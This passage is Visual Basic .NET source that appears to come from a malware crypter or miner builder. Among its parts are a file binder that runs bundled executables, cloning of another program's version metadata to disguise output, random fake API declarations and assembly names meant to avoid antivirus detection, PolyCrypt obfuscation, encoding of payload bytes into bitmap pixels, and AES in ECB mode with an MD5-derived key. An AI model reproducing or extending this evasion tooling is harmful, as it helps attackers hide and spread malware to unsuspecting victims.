
        lastfudno.Text = "test" ' Seal.GetVariable("lastfud")

    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles IconBox.Click
        IconBox.Image = Functions.Gen(x1.Text, y1.Text)
        SelectIcon = Nothing
    End Sub

    Private Sub x1_TextChanged(sender As Object, e As EventArgs) Handles x1.TextChanged
        For i = 0 To x1.Text.Length - 1
            If Not Char.IsNumber(x1.Text.Chars(i)) Then
                MsgBox("Please remove any characters that aren't numbers!")
                Exit For
            End If
        Next
    End Sub
    Private Sub y1_TextChanged(sender As Object, e As EventArgs) Handles y1.TextChanged
        For i = 0 To y1.Text.Length - 1
            If Not Char.IsNumber(y1.Text.Chars(i)) Then
                MsgBox("Please remove any characters that aren't numbers!")
                Exit For
            End If
        Next
    End Sub

    Private Sub AssemblyGen_Click(sender As Object, e As EventArgs) Handles AssemblyGen.Click
        Try
            Dim ran As New Random
            Dim result = MessageBox.Show("Using random assembly can cause detections, continue?", "", MessageBoxButtons.YesNo)
            If result = Windows.Forms.DialogResult.Yes Then
                AssemblyTitle.Text = Functions.RandomAssembly(1) & " " & Functions.RandomAssembly(1) & Functions.RandomExtentionAssembly(1)
                AssemblyDescription.Text = Functions.RandomAssembly(1) & " " & Functions.RandomAssembly(1) & " " & Functions.RandomAssembly(1)
                AssemblyCompany.Text = Functions.RandomAssembly(1) & " " & Functions.RandomAssembly(1) & " " & Functions.RandomAssembly(1)
                AssemblyProduct.Text = Functions.RandomAssembly(1) & " ® " & Functions.RandomAssembly(1) & " " & Functions.RandomAssembly(1)
                AssemblyCopyright.Text = Functions.RandomAssembly(1) & " © " & Functions.RandomAssembly(1) & " " & Functions.RandomAssembly(1)
                AssemblyTrademark.Text = Functions.RandomAssembly(1) & " © " & Functions.RandomAssembly(1) & " " & Functions.RandomAssembly(1)
                AssemblyN1.Text = ran.Next(1, 100) : AssemblyN2.Text = ran.Next(1, 100) : AssemblyN3.Text = ran.Next(1, 100) : AssemblyN4.Text = ran.Next(1, 100)
            End If
        Catch

        End Try
    End Sub

    Private Sub AssemblyClone_Click(sender As Object, e As EventArgs) Handles AssemblyClone.Click
        Dim targ As String
        Dim selek As New OpenFileDialog
        selek.Filter = "Executables|*.exe"
        If selek.ShowDialog = Windows.Forms.DialogResult.OK Then
            targ = selek.FileName
        Else
            Exit Sub
        End If
        Dim myFileVersionInfo As FileVersionInfo = FileVersionInfo.GetVersionInfo(targ)

        AssemblyTitle.Text = myFileVersionInfo.InternalName
        AssemblyDescription.Text = myFileVersionInfo.FileDescription
        AssemblyCompany.Text = myFileVersionInfo.CompanyName
        AssemblyProduct.Text = myFileVersionInfo.ProductName
        AssemblyCopyright.Text = myFileVersionInfo.LegalCopyright
        AssemblyTrademark.Text = myFileVersionInfo.LegalTrademarks

        Dim vers As String = myFileVersionInfo.ProductVersion
        Dim verss As String() = Split(vers, ".")

        Try
            AssemblyN1.Text = verss(0)
            AssemblyN2.Text = verss(1)
            AssemblyN3.Text = verss(2)
            AssemblyN4.Text = verss(3)
        Catch
        End Try

    End Sub

    Private Sub addFile_Click(sender As Object, e As EventArgs) Handles addFile.Click
        Dim ofd1 As New OpenFileDialog
        If ofd1.ShowDialog = Windows.Forms.DialogResult.OK Then

            If BinderView.Items.Count > 0 Then
                For i As Integer = 0 To BinderView.Items.Count - 1
                    If BinderView.Items.Item(i).ToString.Contains(ofd1.FileName) Then
                        MsgBox("This file has already been chosen!")
                        Exit Sub
                    End If
                Next
            End If

            If AlwaysRun.Checked = True Then
                BinderView.Items.Add(New ListViewItem(New String() {ofd1.FileName, "Always"}))
            ElseIf RunOnce.Checked = True Then
                BinderView.Items.Add(New ListViewItem(New String() {ofd1.FileName, "Once"}))
            ElseIf NeverRun.Checked = True Then
                BinderView.Items.Add(New ListViewItem(New String() {ofd1.FileName, "Never"}))
            End If
        End If
    End Sub

    Private Sub delFile_Click(sender As Object, e As EventArgs) Handles delFile.Click
        For Each i As ListViewItem In BinderView.SelectedItems
            BinderView.Items.Remove(i)
        Next
    End Sub

    Private Sub BinderEnable_CheckedChanged(sender As Object) Handles BinderEnable.CheckedChanged
        If BinderEnable.Checked = True Then
            runpanel.Enabled = True
            addFile.Enabled = True
            delFile.Enabled = True
            BinderView.Enabled = True
        Else
            runpanel.Enabled = False
            addFile.Enabled = False
            delFile.Enabled = False
            BinderView.Enabled = False
        End If
    End Sub

    Private Sub proxycheck_CheckedChanged(sender As Object) Handles proxycheck.CheckedChanged
        If proxycheck.Checked = True Then
            proxytypepanel.Enabled = True
            proxyurl.Enabled = True
        Else
            proxytypepanel.Enabled = False
            proxyurl.Enabled = False
        End If
    End Sub

    Private Sub CustCode_CheckedChanged(sender As Object) Handles CustCodeChk.CheckedChanged
        If CustCodeChk.Checked = True Then
            aftedelaychk.Enabled = True
            CustCode.Enabled = True
            referencedll.Enabled = True
            cuscall.Enabled = True
        Else
            aftedelaychk.Enabled = False
            CustCode.Enabled = False
            referencedll.Enabled = False
            cuscall.Enabled = False
        End If
    End Sub

    Private Sub FlatButton1_Click(sender As Object, e As EventArgs)
        Dim wawa As Byte() = System.Text.Encoding.Unicode.GetBytes("Fuk") : Dim wawaw As Byte() = System.Text.Encoding.Unicode.GetBytes("Fuk")
        Dim mama As Byte() = PolyCrypt(wawa, 25) : Dim mamam As Byte() = PolyDeCrypt(mama, 25)
        Dim papa As String = System.Text.Encoding.Unicode.GetString(mamam) : MsgBox(papa)
    End Sub

    Overloads Shared Function PolyCrypt(ByRef Data() As Byte, ByVal Key As Integer) As Byte()
        Array.Resize(Data, Data.Length + 1)
        Data(Data.Length - 1) = Convert.ToByte(New Random().Next(1, 255))
        For i = (Data.Length - 1) To 0 Step -1
            Data(i Mod Data.Length) = CByte(CInt((Data(i Mod Data.Length)) + CInt(Data((i + 1) Mod Data.Length))) Mod 256) Xor Key '(i Mod Key.Length)
        Next
        Return Data
    End Function

    Public Function PolyDeCrypt(ByRef Data() As Byte, ByVal Key As Integer) As Byte()
        For i As Integer = 0 To (Data.Length - 1)
            Data(i Mod Data.Length) = CByte((CInt(Data(i Mod Data.Length) Xor Key) - CInt(Data((i + 1) Mod Data.Length)) + 256) Mod 256) '(i Mod Key.Length)) - CInt(Data((i + 1) Mod Data.Length)) + 256) Mod 256)
        Next
        Array.Resize(Data, Data.Length - 1)
        Return Data
    End Function

    Private Sub FlatClose1_Click(sender As Object, e As EventArgs) Handles FlatClose1.Click
        Environment.Exit(0)
    End Sub

    Private Sub FormSkin1_Click(sender As Object, e As EventArgs) Handles FormSkin1.Click

    End Sub
End Class

Public Class Functions

    Public Shared rand As New Random

    Public Shared Function Rotate(ByVal DCR_CLS_Func_002_arg01 As String) As String
        Dim DCR_CLS_Func_002_var01 As String
        For DCR_CLS_Func_002_var02 As Integer = 1 To DCR_CLS_Func_002_arg01.Length
            DCR_CLS_Func_002_var01 += ChrW(AscW(Mid(DCR_CLS_Func_002_arg01, DCR_CLS_Func_002_var02, 1)) + MinerCrypt.XorRan)
        Next DCR_CLS_Func_002_var02
        Return DCR_CLS_Func_002_var01
    End Function

    Public Shared Function GenerateFont(ByVal numb As Integer) As String
        Dim RandomPool As String() = {"Arial",
                                      "Comic Sans MS",
                                      "Courier New",
                                      "Franklin Gothic",
                                      "Georgia",
                                      "Impact",
                                      "Lucida Console",
                                      "Lucida Sans Unicode",
                                      "Microsoft Sans Serif",
                                      "Palatino Linotype",
                                      "Symbol",
                                      "Tahoma",
                                      "Times New Roman",
                                      "Trebuchet MS",
                                      "Tunga",
                                      "Verdana",
                                      "Webdings",
                                      "WingDings"
                                      }
        Return RandomPool(numb)
    End Function

    Public Shared Function GenerateFontType(ByVal numb As Integer) As String
        Dim RandomPool As String() = {"System.Drawing.FontStyle.Bold",
                                      "System.Drawing.FontStyle.Italic",
                                      "System.Drawing.FontStyle.Regular",
                                      "System.Drawing.FontStyle.Strikeout",
                                      "System.Drawing.FontStyle.Underline"
                                     }
        Return RandomPool(numb)
    End Function

    Public Shared Function GenerateFontMeasurement(ByVal numb As Integer) As String
        Dim RandomPool As String() = {"System.Drawing.GraphicsUnit.Document",
                                      "System.Drawing.GraphicsUnit.Inch",
                                      "System.Drawing.GraphicsUnit.Millimeter",
                                      "System.Drawing.GraphicsUnit.Pixel",
                                      "System.Drawing.GraphicsUnit.Point",
                                      "System.Drawing.GraphicsUnit.World"}

        Return RandomPool(numb)
    End Function

    Public Shared Function RanString(ByVal width As Integer, ByVal height As Integer) As String

        Dim derp As Bitmap
        Dim herp As New IntPtr
        Dim flerp As Icon
        Dim numram As New Random

        Dim FK As String = Usg_ran(rand.Next(5, 18))

        derp = Gen(width, height)

        herp = derp.GetHicon
        flerp = System.Drawing.Icon.FromHandle(herp)

        System.IO.Directory.CreateDirectory(Environ("appdata") & "\DataJunk")

        Using fs As New IO.FileStream(Environ("appdata") & "\DataJunk\" & FK & ".resources", IO.FileMode.Create)
            flerp.Save(fs)
            fs.Close()
        End Using

        Return Environ("appdata") & "\DataJunk\" & FK & ".resources"

    End Function

    Public Shared Function Gen(ByVal x As Integer, ByVal y As Integer) As Bitmap

        Dim Undrawed As New Bitmap(x, y)

        For i As Integer = 1 To x - 1
            For i2 As Integer = 1 To y - 1
                Undrawed.SetPixel(i, i2, Color.FromArgb(rand.Next(0, 255),
                                                        rand.Next(0, 255),
                                                        rand.Next(0, 255)))
            Next
        Next
        Return Undrawed
    End Function

    Public Shared Function Usg_ran(ByVal length As Integer) As String
        Randomize()
        Dim s As New System.Text.StringBuilder("")
        Dim b() As Char = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM".ToCharArray()
        For i As Integer = 1 To length
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function

    Public Shared Function RandomAssembly(ByVal number As Integer) As String
        Dim sb As New System.Text.StringBuilder
        For x As Integer = 0 To number - 1
            sb.Append(AssemblyRandomPool(rand.Next(0, 100)))
        Next
        Return sb.ToString
    End Function

    Public Shared Function RandomExtentionAssembly(ByVal number As Integer) As String
        Dim sb As New System.Text.StringBuilder
        For x As Integer = 0 To number - 1
            sb.Append(AssemblyExtentionRandomPool(rand.Next(0, 5)))
        Next
        Return sb.ToString
    End Function

    Public Shared Function AssemblyExtentionRandomPool(ByVal numb As Integer) As String
        Dim RandomPool As String() = {".exe",
                                      ".dll",
                                      ".config",
                                      ".pdb",
                                      ".ini",
                                      ".io"
                                      }
        Return RandomPool(numb)
    End Function

    Public Shared Function AssemblyRandomPool(ByVal numb As Integer) As String
        Dim RandomPool As String() = {"overdressing",
                                      "montana",
                                      "misintend",
                                      "interreign",
                                      "unimpawned",
                                      "contravener",
                                      "steatopyga",
                                      "forfeitable",
                                      "disagreeable",
                                      "buchman",
                                      "epiblastic",
                                      "interdiction",
                                      "spiritless",
                                      "alcaptonuria",
                                      "mercaptide",
                                      "marianne",
                                      "geistown",
                                      "merry",
                                      "weve",
                                      "spirograph",
                                      "fishplate",
                                      "confineable",
                                      "wealthy",
                                      "epiphloedal",
                                      "nonpunishable",
                                      "teleplay",
                                      "eadwine",
                                      "gabionade",
                                      "parallelization",
                                      "allomerization",
                                      "saracenlike",
                                      "aquarium",
                                      "rematerialized",
                                      "scouter",
                                      "audhumbla",
                                      "gormandizing",
                                      "unbowled",
                                      "moonsif",
                                      "conk",
                                      "phyma",
                                      "monkey",
                                      "uncalumniative",
                                      "haplopia",
                                      "forebody",
                                      "meatus",
                                      "unantagonizable",
                                      "coolie",
                                      "griddlecake",
                                      "retorter",
                                      "summariness",
                                      "sharpbill",
                                      "nonconsignment",
                                      "ralline",
                                      "gynostemium",
                                      "stridulatory",
                                      "salvator",
                                      "nonperformer",
                                      "overpurchasing",
                                      "perique",
                                      "phosphagen",
                                      "instinctually",
                                      "unfielded",
                                      "auspicating",
                                      "eighth",
                                      "sternal",
                                      "wejack",
                                      "precorrespond",
                                      "coaldale",
                                      "septemviri",
                                      "eldritch",
                                      "chucky",
                                      "accommodating",
                                      "phantasm",
                                      "muscid",
                                      "patentability",
                                      "peccable",
                                      "overbred",
                                      "subpreceptorate",
                                      "hounslow",
                                      "darcy",
                                      "wurley",
                                      "burgrave",
                                      "nonuniteable",
                                      "godthaab",
                                      "superqualifying",
                                      "superrational",
                                      "lamelliform",
                                      "constitutional",
                                      "reapplying",
                                      "pronominal",
                                      "intercontorted",
                                      "dodecastylos",
                                      "daraf",
                                      "tanked",
                                      "simple",
                                      "rgenize",
                                      "perseverant",
                                      "arrayal",
                                      "lutherism"
                                      }
        Return RandomPool(numb)
    End Function

    Public Shared Function CreateFakeAPI(ByVal number As Integer) As String
        Dim sb As New System.Text.StringBuilder
        For x As Integer = 0 To number - 1
            sb.Append(vbNewLine + "Declare " & API_CaseType(rand.Next(0, 4)) & Usg_ran(rand.Next(10, 25)) &
            " Lib " & """" & Usg_ran(rand.Next(10, 25)) & API_ExtType(rand.Next(0, 3)) & """" & "(" & API_ValType(rand.Next(0, 2)) & Usg_ran(rand.Next(10, 25)) &
            " As " & API_RanType(rand.Next(0, 4)) & ") As " & API_RanType(rand.Next(0, 4)) & "()")
            '" As " & API_RanType(rand.Next(0, 4)) & ", " & API_ValType(rand.Next(0, 2)) & USG_Gen(rand.Next(10, 25)) &
        Next
        Return sb.ToString
    End Function

    Public Shared Function API_RanType(ByVal numb As Integer) As String
        Dim APIRanType As String() = {"String",
                                      "Byte",
                                      "Char",
                                      "Integer",
                                      "IntPtr"
                                     }
        Return APIRanType(numb)
    End Function
    Public Shared Function API_CaseType(ByVal numb As Integer) As String
        Dim APICaseType As String() = {"Unicode Function ",
                                       "Auto Function ",
                                       "Ansi Function ",
                                       "Function "
                                      }
        Return APICaseType(numb)
    End Function
    Public Shared Function API_ValType(ByVal numb As Integer) As String
        Dim APIValType As String() = {"ByVal ",
                                      "ByRef "
                                      }
        Return APIValType(numb)
    End Function
    Public Shared Function API_ExtType(ByVal numb As Integer) As String
        Dim APIExtType As String() = {".dll",
                                      ".exe",
                                      ".config"
                                      }
        Return APIExtType(numb)
    End Function

    Public Shared Function Forward(data As Byte()) As Bitmap
        ' Compress it first, decrease size if possible
        data = Compress(data)
        ' Calculations
        Dim TotalPixels As Double = (CDbl(data.Length) / CDbl(3)) + CDbl(20)
        Dim SquareRoot As Double = Math.Sqrt(TotalPixels)
        Dim WidthAndHeight As Integer = CInt(Math.Truncate(Math.Ceiling(SquareRoot))) + 20
        ' New image
        Dim Stub As New Bitmap(WidthAndHeight, WidthAndHeight)
        ' Start appending pixels
        Dim BytesWritten As Integer = 0
        ' Loop X axis of the image
        For x As Integer = 0 To Stub.Width - 1
            ' Loop the Y axis of the image
            For y As Integer = 1 To Stub.Height - 1
                ' Starting writes bytes as pixels
                If BytesWritten <= data.Length Then
                    ' Declare RGB as 0x00 (empty bytes)
                    Dim R As Integer = 0, G As Integer = 0, B As Integer = 0
                    ' Just catch exceptions, sometimes we reach too far .. <.< set nulls if required
                    Try
                        R = data(BytesWritten)
                    Catch
                    End Try
                    Try
                        G = data(BytesWritten + 1)
                    Catch
                    End Try
                    Try
                        B = data(BytesWritten + 2)
                    Catch
                    End Try
                    ' Set the actual pixel
                    Stub.SetPixel(x, y, Color.FromArgb(R, G, B))
                    ' Increase the counter by 3 (R,G,B)
                    BytesWritten += 3
                Else
                    Stub.SetPixel(0, 0, Color.FromArgb(0, 0, 0, 0))
                End If
            Next
        Next
        ' Return the image
        Return Stub
    End Function

    Public Shared Function Compress(plainData As Byte()) As Byte()
        Dim compressesData As Byte() = Nothing
        Using outputStream As New MemoryStream()
            Using zip As New Compression.GZipStream(outputStream, Compression.CompressionMode.Compress)
                zip.Write(plainData, 0, plainData.Length)
            End Using
            compressesData = outputStream.ToArray()
        End Using
        Return compressesData
    End Function

End Class

#Region "AES"
Public Class AES
    Public Shared Function AES_Encrypt(ByVal input As Byte(), ByVal pass As String) As Byte()
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim encrypted As Byte()
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESEncrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = input
            encrypted = DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
            Return encrypted
        Catch ex As Exception
        End Try
    End Function

    Public Shared Function AES_Decrypt(ByVal input As Byte(), ByVal pass As String) As Byte()
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim decrypted As Byte()
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = input
            decrypted = DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
            Return decrypted
        Catch ex As Exception
        End Try
    End Function
End Class
#End Region